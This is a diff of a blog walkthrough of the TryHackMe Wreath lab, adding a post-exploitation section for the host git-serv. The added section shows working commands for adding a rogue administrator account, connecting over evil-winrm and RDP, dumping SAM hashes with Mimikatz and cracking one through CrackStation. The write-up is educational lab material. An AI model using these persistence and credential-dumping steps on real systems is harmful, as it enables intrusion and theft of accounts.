@@ -21,7 +21,7 @@ p {
 **OS:** CentOS / Windows Server 2019
 **Platform:** TryHackMe
 **Category:** Network Pivoting
-**Status:** In Progress (Part 1 of 4)
+**Status:** In Progress (Part 1 of 2)
 
 ---
 
@@ -436,29 +436,220 @@ Clean, stable, still SYSTEM, relayed across a network segment that couldn't talk
 
 ---
 
-## What Did We Learn?
+## Confirming the Privilege Level
+ 
+Before creating any accounts, worth confirming exactly what the session can do. `whoami` alone only tells you who, not what:
+ 
+```powershell
+whoami /all
+```
+ 
+```text
+User Name           SID
+=================== ========
+nt authority\system S-1-5-18
+ 
+Group Name                Type    SID
+BUILTIN\Administrators    Alias   S-1-5-32-544    Enabled by default, Group owner
+ 
+Privilege Name          State
+SeTcbPrivilege           Enabled
+SeDebugPrivilege         Enabled
+SeImpersonatePrivilege   Enabled
+```
+  
+Member of `BUILTIN\Administrators`, `SeDebugPrivilege` and `SeImpersonatePrivilege` both enabled. Everything needed to create an account, drop it into Administrators, and load Mimikatz later without fighting anything.
+ 
+---
+ 
+## Creating a Persistent Account
+ 
+Ports 3389 and 5985 were already confirmed open in Part 1, RDP and WinRM. Either gives a way more stable foothold than a relayed webshell, but both need an actual user account rather than the service context currently held. RDP needs Remote Desktop Users or Administrators, WinRM needs Remote Management Users.
+ 
+Since the session's already SYSTEM, creating the account is trivial:
+ 
+```powershell
+net user dizzyking4 IamPeak! /add
+net localgroup Administrators dizzyking4 /add
+net localgroup "Remote Management Users" dizzyking4 /add
+```
+ 
+```text
+The command completed successfully.
+The command completed successfully.
+The command completed successfully.
+```
+ 
+Doesn't persist through a room reset, which is fine, the goal's stable access for the engagement, not a permanent backdoor into a lab box.
+ 
+---
+ 
+## Accessing over WinRM
+ 
+evil-winrm isn't default on Kali:
+ 
+```bash
+sudo gem install evil-winrm
+```
+ 
+```bash
+evil-winrm -u dizzyking4 -p 'IamPeak!' -i 10.200.180.150
+```
+ 
+```text
+Evil-WinRM shell v3.9
+*Evil-WinRM* PS C:\Users\dizzyking4\Documents> whoami
+git-serv\dizzyking4
+```
+ 
+![evil-winrm](/assets/images/WREATHHH/dizzyking4.png)
+ 
+Worth flagging, evil-winrm typically hands back a medium integrity shell for a newly added account even when it's sitting in Administrators. Group membership alone doesn't equal an elevated token over WinRM, UAC still applies. `whoami /priv` here only shows baseline privileges, nowhere near what the relayed SYSTEM shell had.
+ 
+Fine for now though, WinRM's the stable day to day access point going forward. RDP's needed for the next bit.
+ 
+---
+ 
+## RDP and a Shared Drive for Tooling
+ 
+```bash
+xfreerdp /v:10.200.180.150 /u:dizzyking4 /p:'IamPeak!' +clipboard /dynamic-resolution /cert:ignore /drive:/usr/share/windows-resources,share
+```
+ 
+`/drive` is doing the real work here. Mounts a Kali directory as a network share visible inside the RDP session, so tooling never needs manually uploading. `/usr/share/windows-resources` already ships Mimikatz, PowerShell Empire, and a bunch of other Windows post-ex tools pre-staged, so pointing the share straight at it gives instant access from inside the GUI.
+ 
+![rdp-mounted](/assets/images/WREATHHH/share.png)
 
-### 1. RCE Doesn't Mean Privesc Is Needed
+![rdp-contents](/assets/images/WREATHHH/share2.png)
+ 
+---
+ 
+## Running Mimikatz
+ 
+Opened PowerShell as Administrator inside the RDP session (matters, Mimikatz needs an elevated process to do anything) and ran it off the mounted share:
+ 
+```powershell
+\\tsclient\share\mimikatz\x64\mimikatz.exe
+```
+ 
+Loaded, next need the Debug privilege and elevate the token's integrity to SYSTEM. Administrator rights and SYSTEM aren't the same thing, and dumping SAM needs the latter:
+ 
+```text
+privilege::debug
+token::elevate
+```
+ 
+```text
+Privilege '20' OK
+ 
+668  {0;000003e7} 1 D 19934        NT AUTHORITY\SYSTEM   S-1-5-18   Primary
+ -> Impersonated !
+* Process Token : GIT-SERV\dizzyking4
+* Thread Token  : NT AUTHORITY\SYSTEM   Impersonation (Delegation)
+```
+ 
+Token elevated. Full local SAM dump:
+ 
+```text
+lsadump::sam
+```
+ 
+```text
+Domain     : GIT-SERV
+SysKey     : 0841f6354f4b96d21b99345d07b66571
+Local SID  : S-1-5-21-3335744492-1614955177-2693036043
+ 
+RID  : 000001f4 (500)
+User : Administrator
+Hash NTLM: 37db630168e5f82aafa8461e05c6bbd1
+```
+
+![lsadump-sam](/assets/images/WREATHHH/admin_hash.png)
+
+```text
+RID  : 000003e9 (1001)
+User : Thomas
+Hash NTLM: 02d90eda8f6b6b06c32d5f207831101f
+```
+
+![lsadump-sam](/assets/images/WREATHHH/admin_hash.png)
+
+```text
+RID  : 000003ea (1002)
+User : dizzyking4
+Hash NTLM: eea40fb6e68bc601f61a70b152f7608a
+```
+ 
+ 
+_**Jackpot baby \|+_+|/. **_
+
+Three local accounts, three hashes. Administrator, the built in local admin, `dizzyking4`, the account created earlier this session, and `Thomas`, a genuine second local user that hadn't shown up anywhere else in the room so far.
+ 
+---
+ 
+## Cracking Thomas' Hash
+ 
+Administrator's hash isn't going anywhere, a properly random local admin password on a hardened box won't fall to a wordlist in any sane timeframe.
+ 
+Thomas' is a different story. NTLM's unsalted, meaning identical passwords always produce identical hashes regardless of machine or account. CrackStation exploits exactly that, a massive precomputed database of password-to-hash mappings, instant lookup rather than actual cracking:
+ 
+```text
+02d90eda8f6b6b06c32d5f207831101f
+```
+ 
+![crackstation](/assets/images/WREATHHH/cracked.png)
+ 
+Instant hit:
+ 
+```text
+Password: i<3ruby
+```
+ 
+Never do this against a real client hash in an actual engagement btw, submitting live credential material to a third party site is a data handling violation on its own regardless of whether it cracks. Real equivalent is Hashcat locally or dedicated cracking hardware your own org controls. CrackStation's fine here purely because it's an isolated lab built for exactly this demo.
+ 
+---
+ 
+## What Did We Learn?
+ 
+### 1. Group Membership ≠ Privilege Level
+ 
+evil-winrm handing back a medium integrity shell for a freshly created Administrator account trips a lot of people up. Being in the Administrators group doesn't automatically mean an elevated token over WinRM, UAC still applies regardless.
+ 
+### 2. `/drive` in xfreerdp Removes the Upload Problem Entirely
+ 
+Once RDP access exists, everything on the attacking machine becomes instantly available from inside the GUI session. No manual transfer, no webshell upload dance, just point it at your toolbox.
+ 
+### 3. Unsalted NTLM Is Exactly As Weak As Its Reputation
+ 
+If a hash shows up in a common password database, the lookup is genuinely instant. No cracking required, no wordlist needed, just a database query.
+ 
+### 4. Always Verify the Effective Token, Not Just Group Membership
+ 
+`whoami /priv` is the actual source of truth. Group membership tells you what's assigned, the token tells you what's active.
+ 
+### 5. RCE Doesn't Mean Privesc Is Needed
 
 Both Webmin and GitStack handed over SYSTEM/root immediately, no chain required. Worth checking `whoami`/`getuid` right after any exploit lands, sometimes the job's already done.
 
-### 2. Check `hostname` Before Trusting Where You Are
+### 6. Check `hostname` Before Trusting Where You Are
 
 Generating SSH keys from inside a reverse shell puts the private key on the wrong machine if you're not paying attention. `hostname` before `ssh-keygen`, every time.
 
-### 3. An Unidentified Service Beats a Well Known One
+### 7. An Unidentified Service Beats a Well Known One
 
 Between RDP, WinRM, and a bare HTTP service on an unfamiliar port, the HTTP service was the right bet. Narrow, well documented Microsoft protocols on a patched box are a worse target than an unknown web app, especially on a dev's machine.
 
-### 4. `fork` on a Socat Relay Isn't Optional
+### 8. `fork` on a Socat Relay Isn't Optional
 
 Forget it and the relay serves exactly one connection then dies quiet. `jobs` showing `[1]+ Done` instead of a running process is the tell.
 
-### 5. Credential Reuse Is the Real Vulnerability Here
+### 9. Credential Reuse Is the Real Vulnerability Here
 
 Neither exploit needed credentials, but `twreath` showing up as a valid user on two completely separate services across two machines says everything about how this environment's actually built.
 
-Part 2 picks up right here, persistence on git-serv, evil-winrm, RDP with a shared drive for tooling, and Mimikatz pulling hashes straight out of the SAM.
+Thomas' recovered password is very likely reusable elsewhere in this environment, which is exactly the kind of lead that turns into the next phase of a real engagement. Whether that gets pulled on inside this room or a follow up post depends on where the rest of Wreath goes from here.
+
+TILL NEXT TIMEEE
 
 <img src="https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExcHlza3FyOTdmdTBhcGNzemM0bjJtc2JrZzM4eHphbDY2czdjeHpmZSZlcD12MV9naWZzX3NlYXJjaCZjdD1n/lh6EKzQdQghw784jvq/giphy.gif" style="width: 100%; height: auto;" alt="pivoting">
 
